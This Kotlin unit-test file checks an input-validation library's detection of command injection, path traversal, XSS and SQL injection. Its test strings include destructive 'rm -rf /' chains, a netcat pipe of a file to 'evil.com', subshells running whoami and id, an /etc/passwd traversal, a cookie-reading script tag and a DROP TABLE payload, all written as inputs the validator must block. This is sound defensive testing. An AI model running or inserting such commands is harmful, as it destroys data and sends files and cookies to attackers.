package com.aladdin.security

import com.aladdin.security.validation.CommandInjectionPreventer
import com.aladdin.security.validation.InputSanitizer
import com.aladdin.security.validation.InputValidator
import com.aladdin.security.validation.SqlInjectionPreventer
import com.aladdin.security.validation.XssPreventer
import com.google.common.truth.Truth.assertThat
import org.junit.Test

class SecurityIntegrationTest {

    private val validator = InputValidator()

    // ── Command injection tests ────────────────────────────────────────────────

    @Test fun `command injection - semicolon detected`() {
        val result = CommandInjectionPreventer.validate("ls; rm -rf /")
        assertThat(result.safe).isFalse()
    }

    @Test fun `command injection - pipe detected`() {
        val result = CommandInjectionPreventer.validate("cat file | nc evil.com 9090")
        assertThat(result.safe).isFalse()
    }

    @Test fun `command injection - backtick detected`() {
        val result = CommandInjectionPreventer.validate("echo \`whoami\`")
        assertThat(result.safe).isFalse()
    }

    @Test fun `command injection - dollar sign subshell detected`() {
        val result = CommandInjectionPreventer.validate("echo \$(id)")
        assertThat(result.safe).isFalse()
    }

    @Test fun `command injection - double ampersand detected`() {
        val result = CommandInjectionPreventer.validate("true && rm -rf /")
        assertThat(result.safe).isFalse()
    }

    @Test fun `command injection - safe command passes`() {
        val result = CommandInjectionPreventer.validate("hello world")
        assertThat(result.safe).isTrue()
    }

    @Test fun `command strip removes injection chars`() {
        val stripped = CommandInjectionPreventer.strip("hello; rm -rf /")
        assertThat(stripped).doesNotContain(";")
    }

    // ── Input sanitizer tests ─────────────────────────────────────────────────

    @Test fun `sanitize truncates to max length`() {
        val input = "a".repeat(1000)
        val sanitized = InputSanitizer.sanitize(input, maxLength = 100)
        assertThat(sanitized.length).isAtMost(100)
    }

    @Test fun `sanitize path strips traversal`() {
        val safePath = InputSanitizer.sanitizePath("../../../etc/passwd")
        assertThat(safePath).doesNotContain("..")
    }

    @Test fun `sanitize path strips null bytes`() {
        val safePath = InputSanitizer.sanitizePath("/data/file\u0000.txt")
        assertThat(safePath).doesNotContain("\u0000")
    }

    // ── Integration - full pipeline ───────────────────────────────────────────

    @Test fun `full security pipeline - safe text passes all checks`() {
        val input = "What is the weather in London today?"
        val result = validator.validateText(input)
        assertThat(result.valid).isTrue()
        assertThat(result.violations).isEmpty()
        assertThat(result.sanitized).isNotEmpty()
    }

    @Test fun `full security pipeline - attack vector blocked`() {
        val attacks = listOf(
            "<script>document.cookie</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "javascript:alert(1)"
        )
        attacks.forEach { attack ->
            val result = validator.validateText(attack)
            assertThat(result.hasViolations).isTrue()
        }
    }

    @Test fun `concurrent validation is thread safe`() {
        val errors = java.util.concurrent.atomic.AtomicInteger(0)
        val threads = (1..10).map { i ->
            Thread {
                try {
                    repeat(100) {
                        validator.validateText("Safe message $i")
                        validator.validateText("<script>xss</script>")
                    }
                } catch (e: Exception) {
                    errors.incrementAndGet()
                }
            }
        }
        threads.forEach { it.start() }
        threads.forEach { it.join(5000) }
        assertThat(errors.get()).isEqualTo(0)
    }

    @Test fun `validate 1000 inputs within 1 second`() {
        val inputs = (1..1000).map { "Normal user input message number $it" }
        val start = System.currentTimeMillis()
        inputs.forEach { validator.validateText(it) }
        assertThat(System.currentTimeMillis() - start).isLessThan(1000L)
    }
}
